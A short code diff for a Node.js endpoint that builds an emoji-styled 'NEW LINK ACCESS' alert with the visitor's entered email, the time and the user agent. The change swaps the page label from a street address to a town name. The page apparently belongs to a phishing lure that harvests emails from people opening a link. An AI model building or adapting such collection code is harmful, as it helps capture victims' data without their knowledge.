@@ -43,7 +43,7 @@ app.post('/api/access', async (req, res) => {
 
     const message = 
       `🔓 NEW LINK ACCESS 🔓\n` +
-      `📄 Page: 925 ROSSLAND RD W\n` +
+      `📄 Page: Channel-Port-aux-Basques\n` +
       `🕒 Time: ${now}\n` +
       `📧 Email Entered: ${email}\n` +
       `🌐 User Agent: ${userAgent || 'unknown'}\n` +
